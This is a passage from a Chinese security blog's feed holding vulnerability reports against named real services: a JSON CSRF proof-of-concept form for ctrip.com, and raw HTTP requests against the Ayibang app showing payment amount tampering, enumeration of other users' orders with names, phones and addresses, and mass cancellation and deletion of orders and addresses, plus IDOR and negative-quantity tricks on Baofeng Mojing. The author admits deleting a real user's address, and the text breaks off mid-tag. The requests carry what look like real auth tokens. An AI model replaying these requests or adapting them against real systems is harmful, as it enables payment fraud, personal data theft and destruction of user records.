href="#6-浏览器处打开这个Poc" class="headerlink" title="6. 浏览器处打开这个Poc"></a>6. 浏览器处打开这个Poc</h4><p><img src="http://static.zybuluo.com/1kbfree/jec1gasck1j6t5ns9dyyve3e/image_1cggvbjp914dp14bt1mec1j0r15vi2n.png" alt="image_1cggvbjp914dp14bt1mec1j0r15vi2n.png-32kB"></p><p><img src="http://static.zybuluo.com/1kbfree/a3m0bhbmy7ximhww0y1rkas3/image_1cggvcoam1i5h3q4njf1sf41a3034.png" alt="image_1cggvcoam1i5h3q4njf1sf41a3034.png-46.6kB"></p><p>我们确认一下是否可以发布</p><p><img src="http://static.zybuluo.com/1kbfree/ykureziocu1mytqfp1b16wm9/image_1cggve0kq18quhsf1j4al8hfi4h.png" alt="image_1cggve0kq18quhsf1j4al8hfi4h.png-330.1kB"></p><p><em>可以看到并没有发布，这其中肯定有猫腻，我们再继续分析一波</em></p><h4 id="7-分析异常"><a href="#7-分析异常" class="headerlink" title="7. 分析异常"></a>7. 分析异常</h4><p><img src="http://static.zybuluo.com/1kbfree/57mwvrqtms0a7zrmawc0dflg/image_1cggvl77q79isqk1l4di5ts0u4u.png" alt="image_1cggvl77q79isqk1l4di5ts0u4u.png-129.2kB"></p><h4 id="8-异常处理"><a href="#8-异常处理" class="headerlink" title="8. 异常处理"></a>8. 异常处理</h4><blockquote><p>异常分析后修改的<code>Csrf Poc</code>如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">history.pushState('', '', '/');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://you.ctrip.com/TravelSite/Member/SaveNewTravel"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"text/plain"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">'&#123;"Content":"&lt;p&gt;1111111111&lt;/p&gt;","UploadPicContent":"","CoverImageId":0,"TravelId":"3689394","CoverLocationY":0,"ClassifiedInfo":&#123;"DistrictList":[&#123;"DistrictId":"110000","DistrictName":"涓浗锛屼簹娲�","IsSelected":true&#125;,&#123;"DistrictId":"1","DistrictName":"鍖椾含锛屼腑鍥�","IsSelected":true&#125;],"TagList":[],"TravelId":"3689394","ClassifiedType":6,"TravelDays":1111111111,"DepartureDate":"2018-06-13","Consume":111,"CompanionType":1&#125;,"PublishStatus":1,"Title":"1111'</span> <span class="attr">value</span>=<span class="string">'"&#125;'</span> <span class="attr">type</span>=<span class="string">'hidden'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote><h4 id="9-在浏览器处打开此POC"><a href="#9-在浏览器处打开此POC" class="headerlink" title="9. 在浏览器处打开此POC"></a>9. 在浏览器处打开此POC</h4><p><img src="http://static.zybuluo.com/1kbfree/knjs1crgvnkuduke1akrzii8/image_1cgh0lpg61nhdgll1aqj1a3h1f0t78.png" alt="image_1cgh0lpg61nhdgll1aqj1a3h1f0t78.png-28.3kB"></p><p><img src="http://static.zybuluo.com/1kbfree/1nil8f18impk1tdhrbjynau8/image_1cgh0mh7sh7ujg710vt1uhc1sd47l.png" alt="image_1cgh0mh7sh7ujg710vt1uhc1sd47l.png-309.5kB"></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;内部文章，禁止转载&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/Web%E6%94%BB%E9%98%B2/"/>
    
      <category term="渗透测试" scheme="127.0.0.1/categories/Web%E6%94%BB%E9%98%B2/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="作者：Iamfree" scheme="127.0.0.1/categories/Web%E6%94%BB%E9%98%B2/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BD%9C%E8%80%85%EF%BC%9AIamfree/"/>
    
    
      <category term="漏洞挖掘" scheme="127.0.0.1/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
      <category term="Json Csrf" scheme="127.0.0.1/tags/Json-Csrf/"/>
    
  </entry>
  
  <entry>
    <title>腾讯某处SSRF漏洞</title>
    <link href="127.0.0.1/2018/06/16/%E8%85%BE%E8%AE%AF%E6%9F%90%E5%A4%84SSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>127.0.0.1/2018/06/16/腾讯某处SSRF漏洞/</id>
    <published>2018-06-16T09:50:20.000Z</published>
    <updated>2018-06-16T09:50:20.904Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;十年寒窗无人问，一举成名天下知&lt;br&gt;                            – Cai_Team&lt;/p&gt;
&lt;/blockquote&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>阿姨帮最新APP漏洞大全(支付漏洞/地址/订单遍历/删除等)</title>
    <link href="127.0.0.1/2018/06/16/%E9%98%BF%E5%A7%A8%E5%B8%AE%E6%9C%80%E6%96%B0APP%E6%BC%8F%E6%B4%9E%E5%A4%A7%E5%85%A8/"/>
    <id>127.0.0.1/2018/06/16/阿姨帮最新APP漏洞大全/</id>
    <published>2018-06-16T09:39:01.000Z</published>
    <updated>2018-06-16T09:47:52.338Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>危害：看文章自己脑补<br>漏洞等级：高<br>提交时间：   2016-02-02 12:45</p></blockquote><a id="more"></a>    <h3 id="简要描述："><a href="#简要描述：" class="headerlink" title="简要描述："></a>简要描述：</h3><p>阿姨帮最新版APP(v6.2.0)漏洞打包</p><h3 id="详细说明："><a href="#详细说明：" class="headerlink" title="详细说明："></a>详细说明：</h3><h4 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h4><h5 id="1-超低价格支付订单"><a href="#1-超低价格支付订单" class="headerlink" title="1. 超低价格支付订单"></a>1. 超低价格支付订单</h5><p>点击首页，随便选择一项服务并下订单</p><p><img src="http://static.zybuluo.com/1kbfree/nwywtw101sydlcvxyun0xxu5/image_1cg3udg33qk4cgk6f64krptq9.png" alt="image_1cg3udg33qk4cgk6f64krptq9.png-62.5kB"></p><p><img src="http://static.zybuluo.com/1kbfree/og7jbdinrgav66gvtqjcohfy/image_1cg3ufnh119mf1a2a1edf5vbjum.png" alt="image_1cg3ufnh119mf1a2a1edf5vbjum.png-78.7kB"></p><h5 id="2-点击确认支付抓包并先截断提交："><a href="#2-点击确认支付抓包并先截断提交：" class="headerlink" title="2. 点击确认支付抓包并先截断提交："></a>2. 点击确认支付抓包并先截断提交：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST https://api-cust.ayibang.com/v1/pay/wx/sign HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34</span><br><span class="line">Network: WiFi</span><br><span class="line">City: beijing</span><br><span class="line">Timestamp: 1452845167007</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Content-Length: 128</span><br><span class="line">out_trade_no=11291191&amp;attach=0_1_13800000000_0&amp;body=%E9%98%BF%E5%A7%A8%E5%B8%AE%E6%94%AF%E4%BB%98&amp;total_fee=5000&amp;trade_type=AP</span><br></pre></td></tr></table></figure><p><em>将上面的total_fee的值改为1，提交</em></p><p><img src="http://static.zybuluo.com/1kbfree/1r7oj128q2miz6cc0q1y66ik/image_1cg3ul0q0178ondf136n1bklbpj13.png" alt="image_1cg3ul0q0178ondf136n1bklbpj13.png-38.2kB"></p><p><em>支付成功后订单成为待确认状态，说明支付成功</em></p><p><img src="http://static.zybuluo.com/1kbfree/uv9e3uhr4itz91mlaqkjp4hw/image_1cg3ulbjk776vs8imhrn34kd1g.png" alt="image_1cg3ulbjk776vs8imhrn34kd1g.png-47.3kB"></p><h4 id="任意用户订单查看"><a href="#任意用户订单查看" class="headerlink" title="任意用户订单查看"></a>任意用户订单查看</h4><p>点击我们刚生成的订单，系统访问如下地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET https://api-cust.ayibang.com/v1/order/detail?orderID=11291191 HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34</span><br><span class="line">Network: WiFi</span><br><span class="line">City: beijing</span><br><span class="line">Timestamp: 1452845324989</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br></pre></td></tr></table></figure><p><em>orderID=11291191处可遍历，burp出手对订单的后四位遍历</em></p><p><img src="http://static.zybuluo.com/1kbfree/tarjvjo28tnq0almee667dqm/image_1cg3untagce0og8n901nln75e1t.png" alt="image_1cg3untagce0og8n901nln75e1t.png-212.4kB"></p><p>N多订单信息可看</p><p><img src="http://static.zybuluo.com/1kbfree/iu8l9ftbkxioegspg7psf7bz/image_1cg3uo8rl1o5ii0p3kfrq8117h2a.png" alt="image_1cg3uo8rl1o5ii0p3kfrq8117h2a.png-282.2kB"></p><p><em>以订单ID为11290071为例，可查看到该订单涉及用户的姓名 手机号 住址等</em></p><p><img src="http://static.zybuluo.com/1kbfree/mzxfhiyt1fdrikeevmdw5tt7/image_1cg3uokl71f7b1um568d15kjcjs2n.png" alt="image_1cg3uokl71f7b1um568d15kjcjs2n.png-228.7kB"></p><h4 id="任意用户订单取消漏洞"><a href="#任意用户订单取消漏洞" class="headerlink" title="任意用户订单取消漏洞"></a>任意用户订单取消漏洞</h4><p>点击之前的订单，点击取消订单，会抓到如下请求包:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST https://api-cust.ayibang.com/v1/order/cancel HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34</span><br><span class="line">Network: WiFi</span><br><span class="line">City: beijing</span><br><span class="line">Timestamp: 1452846770206</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Content-Length: 42</span><br><span class="line">data=%7B%22orderID%22%3A%2211291191%22%7D&amp;</span><br></pre></td></tr></table></figure></p><blockquote><p>post处内容url解码后为：{“orderID”:”11291191”}</p></blockquote><ul><li>通过遍历orderID可删除所有订单</li><li>通过另一手机注册一个账号并下一个订单</li></ul><p><img src="http://static.zybuluo.com/1kbfree/mzp7hnp0e2a87hahk7jiq8ql/image_1cg3ur1ec14g027r19g41dkt1mcf34.png" alt="image_1cg3ur1ec14g027r19g41dkt1mcf34.png-40.7kB"></p><ul><li>抓包查得该订单ID为11292401</li></ul><p>提交以下数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST https://api-cust.ayibang.com/v1/order/cancel HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34</span><br><span class="line">Network: WiFi</span><br><span class="line">City: beijing</span><br><span class="line">Timestamp: 1452846770206</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Content-Length: 42</span><br><span class="line">data=%7B%22orderID%22%3A%2211292401%22%7D&amp;</span><br></pre></td></tr></table></figure><p><em>成功取消订单</em></p><p><img src="http://static.zybuluo.com/1kbfree/8zylu68skeytdn4sc58pfbfd/image_1cg3ut157c3iebiblu6bi9uo3h.png" alt="image_1cg3ut157c3iebiblu6bi9uo3h.png-203.1kB"></p><p><strong>再查看该用户订单列表，已经成为空：</strong></p><p><img src="http://static.zybuluo.com/1kbfree/22w1a0rxqcjyi8hjuq8ytgjq/image_1cg3utb0fmnlhhrq2vb4ibrj3u.png" alt="image_1cg3utb0fmnlhhrq2vb4ibrj3u.png-26.9kB"></p><h4 id="任意用户服务地址删除"><a href="#任意用户服务地址删除" class="headerlink" title="任意用户服务地址删除"></a>任意用户服务地址删除</h4><h5 id="1-点击app里面服务地址"><a href="#1-点击app里面服务地址" class="headerlink" title="1. 点击app里面服务地址"></a>1. 点击app里面服务地址</h5><p><img src="http://static.zybuluo.com/1kbfree/ppen0j15r6x111062t026kzr/image_1cg3uu7cn1ogc1ii614lh1r111qnm4b.png" alt="image_1cg3uu7cn1ogc1ii614lh1r111qnm4b.png-46.6kB"></p><h5 id="2-添加两个地址"><a href="#2-添加两个地址" class="headerlink" title="2. 添加两个地址"></a>2. 添加两个地址</h5><p><img src="http://static.zybuluo.com/1kbfree/cms8wr2368k53n9yeri8dsw0/image_1cg3uurka153p7s6m3c1lc1ohf4o.png" alt="image_1cg3uurka153p7s6m3c1lc1ohf4o.png-28.1kB"></p><p><strong>然后删除上面的两个地址，并抓包</strong></p><h6 id="1-删除第一个地址请求数据包如下："><a href="#1-删除第一个地址请求数据包如下：" class="headerlink" title="1. 删除第一个地址请求数据包如下："></a>1. 删除第一个地址请求数据包如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET https://api-cust.ayibang.com/v1/house/delete?houseID=17334752 HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557</span><br><span class="line">Network: WiFi</span><br><span class="line">City: nanjing</span><br><span class="line">Timestamp: 1452841496773</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br></pre></td></tr></table></figure><p>返回数据包如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Fri, 15 Jan 2016 07:04:57 GMT</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: PHP/5.6.11</span><br><span class="line">Content-Length: 628</span><br><span class="line">&#123;&quot;house&quot;:&#123;&quot;id&quot;:&quot;17334752&quot;,&quot;custID&quot;:&quot;16989352&quot;,&quot;city&quot;:&quot;nanjing&quot;,&quot;cityName&quot;:&quot;\u5357\u4eac&quot;,&quot;zone&quot;:&quot;null&quot;,&quot;nameAddr&quot;:&quot;\u5b9e\u9a8c\</span><br></pre></td></tr></table></figure></p><p>上面内容解码后如下：<br><img src="http://static.zybuluo.com/1kbfree/hw8ryqt15emqjebjk8f8awp7/image_1cg3v42g41m3b18ku15es1ea418n055.png" alt="image_1cg3v42g41m3b18ku15es1ea418n055.png-104.9kB"></p><blockquote><p>可以看到statusName处标记为已删除，并且数据包返回的ID与删除的ID为同一ID：17334752</p></blockquote><p><strong>再删除另外一个地址：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET https://api-cust.ayibang.com/v1/house/delete?houseID=17336562 HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557</span><br><span class="line">Network: WiFi</span><br><span class="line">City: nanjing</span><br><span class="line">Timestamp: 1452841783577</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br></pre></td></tr></table></figure></p><blockquote><p>由此可看到系统删除服务地址是根据不同的ID来实现的，虽然数字不是连续的，但是经过几次尝试发现都是以17开头的8位数字，如此遍可以通过遍历id删除其它用户的服务地址</p></blockquote><p><strong>只需提交以下数据包：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET https://api-cust.ayibang.com/v1/house/delete?houseID=17336562 HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557</span><br></pre></td></tr></table></figure></p><p>通过burpsuite 遍历houseID处，即可删除所有用户收获地址</p><p><strong>以下为我随便找的一个用户地址（抱歉给这位用户带来困扰）：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET https://api-cust.ayibang.com/v1/house/delete?houseID=17330512 HTTP/1.1</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36 OPR/34.0.2036.47</span><br><span class="line">DNT: 1</span><br><span class="line">Accept-Encoding: gzip, deflate, lzma, sdch</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br></pre></td></tr></table></figure></p><p><strong>返回：</strong><br><img src="http://static.zybuluo.com/1kbfree/o4qwyxhj25dogg6q0mc245ma/image_1cg3v85b91grlggsheep5k144b5i.png" alt="image_1cg3v85b91grlggsheep5k144b5i.png-104.3kB"></p><h3 id="漏洞证明"><a href="#漏洞证明" class="headerlink" title="漏洞证明"></a>漏洞证明</h3><p>如果需要通过浏览器复现上面问题，需要注意数据请求处有一个请求头：<br><code>Authorization: 211ebac721824b5cb688e3c6d1187bc21beff557</code><br>此处的authorization是用户在登录APP的时候服务器返回的认证key<br><img src="http://static.zybuluo.com/1kbfree/1esugc3rjsugawvsoapq73j0/image_1cg3vad5f5mr1rjf6j9k5m1fv55v.png" alt="image_1cg3vad5f5mr1rjf6j9k5m1fv55v.png-279.8kB"></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;危害：看文章自己脑补&lt;br&gt;漏洞等级：高&lt;br&gt;提交时间：   2016-02-02 12:45&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="乌云历史文章" scheme="127.0.0.1/categories/%E4%B9%8C%E4%BA%91%E5%8E%86%E5%8F%B2%E6%96%87%E7%AB%A0/"/>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/%E4%B9%8C%E4%BA%91%E5%8E%86%E5%8F%B2%E6%96%87%E7%AB%A0/Web%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="漏洞挖掘" scheme="127.0.0.1/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
      <category term="支付漏洞" scheme="127.0.0.1/tags/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="越权漏洞" scheme="127.0.0.1/tags/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="Xss漏洞" scheme="127.0.0.1/tags/Xss%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="密码逻辑漏洞" scheme="127.0.0.1/tags/%E5%AF%86%E7%A0%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>暴风魔镜某处设计缺陷可获取整站用户信息(xss/越权/密码逻辑/支付漏洞等)</title>
    <link href="127.0.0.1/2018/06/16/%E6%9A%B4%E9%A3%8E%E9%AD%94%E9%95%9C%E6%9F%90%E5%A4%84%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%8F%AF%E8%8E%B7%E5%8F%96%E6%95%B4%E7%AB%99%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF/"/>
    <id>127.0.0.1/2018/06/16/暴风魔镜某处设计缺陷可获取整站用户信息/</id>
    <published>2018-06-16T07:47:31.000Z</published>
    <updated>2018-06-16T09:20:00.877Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>危害：看文章自己脑补<br>漏洞等级：高<br>提交时间：   2016-04-20 18:15</p></blockquote><a id="more"></a><h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p>a、首先来到用户信息地址管理这边</p><p><img src="http://static.zybuluo.com/1kbfree/by1eecokc7syxsb2b4he3dal/image_1cg3o6vu41qvff0jgoj55hn429.png" alt="image_1cg3o6vu41qvff0jgoj55hn429.png-18.3kB"></p><p>b、编辑保存抓包 当前用户地址是<code>48783</code> 改了下<code>48782</code>就直接遍历出来了</p><p><img src="http://static.zybuluo.com/1kbfree/b1nvfq2np6deai3hapi0alxd/image_1cg3o8is916j81koa1mpj18j7bkfm.png" alt="image_1cg3o8is916j81koa1mpj18j7bkfm.png-99.5kB"></p><p>c、下面直接遍历addressid</p><p><img src="http://static.zybuluo.com/1kbfree/c2uy1ihh6oi9uvv88cah7aaj/image_1cg3o968q13s2oqi11p5ipp3dc13.png" alt="image_1cg3o968q13s2oqi11p5ipp3dc13.png-46.5kB"></p><p>d、burp里显示乱码</p><p><img src="http://static.zybuluo.com/1kbfree/fqlpxgwom2s69n20ku78r9j4/image_1cg3o9re5buo1o9k2c116b21v9620.png" alt="image_1cg3o9re5buo1o9k2c116b21v9620.png-93.3kB"></p><p>e、然后导出到本地就变成中文啦 证明危害即可遍历几条</p><p><img src="http://static.zybuluo.com/1kbfree/rz0qcmgw0ndbt6aq135awfel/image_1cg3oaevv1q934pa1u1g1if418lc2d.png" alt="image_1cg3oaevv1q934pa1u1g1if418lc2d.png-84.8kB"></p><p>f、地址管理处可以xss</p><p><img src="http://static.zybuluo.com/1kbfree/ya2bf6ypnf6exd6l2bo3qk87/image_1cg3occi7lrp1ccvamgthu1jja2q.png" alt="image_1cg3occi7lrp1ccvamgthu1jja2q.png-18.3kB"></p><p><img src="http://static.zybuluo.com/1kbfree/4gv88bkmzsrl8daq2dqs6q0p/image_1cg3ocmmb1ci61glk4j3bgrdl937.png" alt="image_1cg3ocmmb1ci61glk4j3bgrdl937.png-62.7kB"></p><blockquote><p>可是只能x本地(self-xss)不太甘心 这个之前测试都是后台查看订单后才可以触发但是魔镜又贵 看了官网又挖不到支付漏洞宝宝不开心<br>然后下载app测试了一下 哈哈 来着购物车抓包</p></blockquote><p><img src="http://static.zybuluo.com/1kbfree/llyi39xq2fdiec3ds7maid34/image_1cg3oepri1oodro9qik38i19ns3k.png" alt="image_1cg3oepri1oodro9qik38i19ns3k.png-152.9kB"></p><p>g、修改num数量 1,-1</p><p><img src="http://static.zybuluo.com/1kbfree/2oyr7jbtm4mm7s113o2gijju/image_1cg3ojg8s1r2412ts1cu75j1l944h.png" alt="image_1cg3ojg8s1r2412ts1cu75j1l944h.png-34.7kB"></p><p><em>果然可以</em></p><p><img src="http://static.zybuluo.com/1kbfree/8zx2nrq78tdztyblltgccvl1/image_1cg3olo38nu41tcb1p3vskc1bj5b.png" alt="image_1cg3olo38nu41tcb1p3vskc1bj5b.png-158.9kB"></p><p>h、随后就到了支付宝付款界面ok 这里要是提交订单后台查看xss应该可以触发 但是莫有钱</p><p><img 